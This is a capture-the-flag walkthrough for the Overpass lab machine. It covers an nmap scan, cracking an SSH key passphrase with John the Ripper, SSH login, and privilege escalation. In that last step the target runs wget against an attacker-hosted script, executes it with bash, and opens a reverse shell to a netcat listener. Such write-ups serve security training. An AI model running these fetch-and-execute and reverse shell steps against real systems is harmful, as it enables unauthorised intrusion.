# Overpass CTF Walkthrough

**Target IP:** `10.10.113.221`  
**Date:** May 1, 2025  
**Tools Used:** Nmap, ssh2john, John the Ripper, Python HTTP Server, netcat

---

## 🔍 Reconnaissance

We started with a basic Nmap scan to identify open services on the target:

```bash
nmap 10.10.113.221 -sC -sV
```

**Scan Results:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
```

A Golang-based HTTP server and an SSH service were open. We moved on to investigate the web server.

---

## 🌐 Enumeration

Visiting `http://10.10.113.221` in the browser showed a custom Overpass-branded page.

Next, we examined the files provided to us locally, specifically an SSH private key named `id_key` and its associated hash.

To crack the private key, we used `ssh2john` and `John the Ripper`:

```bash
/usr/share/john/ssh2john.py id_key > id.hash
john id.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

**Cracked Password:** `james13`

We now had SSH credentials:
- **User:** james
- **Key:** `id_key`
- **Passphrase:** `james13`

---

## 🔓 Exploitation

We logged in via SSH:

```bash
ssh -i id_key james@10.10.113.221
```

We were successfully logged in as `james` on the remote host:

```text
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64)
```

We then prepared for privilege escalation by setting up a Python HTTP server to serve a custom shell script:

```bash
cd Music/overpass
mkdir downloads
cd downloads
mkdir src
touch buildscript.sh
nano buildscript.sh  # (Insert reverse shell payload)
cd ..
sudo python3 -m http.server 80
```

Simultaneously, on the remote host we edited `/etc/hosts`, likely to prepare for some redirection or name resolution.

---

## ⚙️ Privilege Escalation

A reverse shell was set to connect back using `nc` on the attacking machine:

```bash
nc -lvnp 4444
```

From the target, the reverse shell payload in `buildscript.sh` was fetched and executed, likely giving root or higher-privilege access.

```bash
wget http://<attacker-ip>/downloads/src/buildscript.sh
bash buildscript.sh
```

After triggering the reverse shell from the victim, a connection was received on port `4444` on our Kali box, confirming successful shell access.

---

## ✅ Summary

| Phase              | Action                                                                 |
|-------------------|------------------------------------------------------------------------|
| Recon              | Nmap scan, discovered ports 22 and 80                                 |
| Enumeration        | Cracked SSH private key passphrase using John                         |
| Exploitation       | SSH access via cracked key, reverse shell hosted via Python server   |
| Privilege Escalation | Executed shell script from target system, received reverse shell     |

---

## 📌 Notes
- The HTTP server needed to be run using Python3 as Python2's `SimpleHTTPServer` was deprecated.
- Make sure file paths match exactly; a 404 was logged due to incorrect path on initial GET request.

---

## proof of completion 



 
